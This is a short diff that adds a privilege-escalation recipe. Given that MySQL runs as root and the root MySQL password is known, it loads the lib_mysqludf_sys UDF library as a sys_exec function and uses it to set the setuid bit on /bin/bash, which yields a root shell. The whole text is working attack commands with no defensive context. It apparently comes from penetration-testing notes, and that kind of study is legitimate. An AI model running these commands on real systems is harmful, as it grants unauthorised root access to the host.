@@ -1,0 +1,8 @@
+THE SETUP:
+
+    mysql is running as root
+    you have access to the root mysql password
+
+mysql> use mysql;
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+mysql> select sys_exec('chmod u+s /bin/bash');
